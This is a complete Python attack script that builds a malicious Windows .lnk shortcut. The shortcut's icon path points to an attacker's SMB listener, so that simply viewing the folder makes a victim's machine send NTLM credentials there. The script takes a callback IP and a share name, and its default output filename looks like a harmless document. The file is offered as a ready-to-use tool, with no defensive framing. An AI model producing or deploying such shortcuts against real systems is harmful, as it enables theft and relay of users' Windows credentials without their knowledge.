#!/usr/bin/env python3
r"""
Generate a malicious .lnk that coerces NTLM auth via UNC icon resolution.

The shortcut's IconLocation points at \\ATTACKER\share\icon.ico. When Explorer
renders the folder containing the .lnk, it resolves the icon over SMB.

Usage:
    python3 gen_lnk_coerce.py -i 10.10.14.7
    python3 gen_lnk_coerce.py -i 10.10.14.7 --share pub --icon a.ico -o '~report.lnk'
"""

import argparse
import struct
import sys
import os

def build_lnk(icon_unc):
    """
        Builds header manually to reduce external dependencies.
        Only designed for simple use cases
    """
    # ShellLinkHeader (76 bytes)
    header = struct.pack('<I', 0x0000004C)                       # HeaderSize
    header += bytes([0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00,   # LinkCLSID
                     0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00,
                     0x00, 0x46])
    flags = 0x00000040 | 0x00000080                             # HasIconLocation | IsUnicode
    header += struct.pack('<I', flags)                          # LinkFlags
    header += struct.pack('<I', 0x00000020)                     # FileAttributes (ARCHIVE)
    header += b'\x00' * 24                                      # Creation/Access/Write times
    header += struct.pack('<I', 0)                              # FileSize
    header += struct.pack('<I', 0)                              # IconIndex
    header += struct.pack('<I', 1)                              # ShowCommand (SW_SHOWNORMAL)
    header += struct.pack('<H', 0)                              # HotKey
    header += struct.pack('<H', 0)                              # Reserved1
    header += struct.pack('<I', 0)                              # Reserved2
    header += struct.pack('<I', 0)                              # Reserved3

    # StringData: ICON_LOCATION (unicode, CountCharacters prefix, no null terminator)
    encoded = icon_unc.encode('utf-16-le')
    string_data = struct.pack('<H', len(icon_unc)) + encoded

    return header + string_data


def validate(args):
    if args.icon.startswith('\\') or '/' in args.icon:
        print("[!] --icon should be a bare filename (e.g. a.ico), not a path", file=sys.stderr)
        sys.exit(1)
    if not args.output.lower().endswith('.lnk'):
        print("[!] Output filename should end in .lnk", file=sys.stderr)
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(description="Generate a UNC-icon .lnk for NTLM coercion")
    parser.add_argument('-i', '--callback-ip', required=True, help="Listener IP/host the victim authenticates to")
    parser.add_argument('--share', default='share', help="Share name in the UNC icon path (need not exist; default: share)")
    parser.add_argument('--icon', default='icon.ico', help="Bare icon filename in the UNC path (default: icon.ico)")
    parser.add_argument('-o', '--output', default='~document.lnk', help="Output .lnk filename (default: ~document.lnk)")
    parser.add_argument('--verbose', action='store_true', help="Talk more")
    args = parser.parse_args()

    validate(args)

    icon_unc = "\\\\{}\\{}\\{}".format(args.callback_ip, args.share, args.icon)

    try:
        data = build_lnk(icon_unc)
        with open(args.output, 'wb') as f:
            f.write(data)
    except OSError as e:
        print("[!] Failed to write {}: {}".format(args.output, e), file=sys.stderr)
        sys.exit(1)

    print("[+] Wrote {} ({} bytes)".format(args.output, len(data)))
    print("[+] Icon UNC path: {}".format(icon_unc))
    if args.verbose:
        print("[*] Header bytes: {}".format(data[:76].hex()))
        print("[*] StringData:   {}".format(data[76:].hex()))

if __name__ == "__main__":
    main()
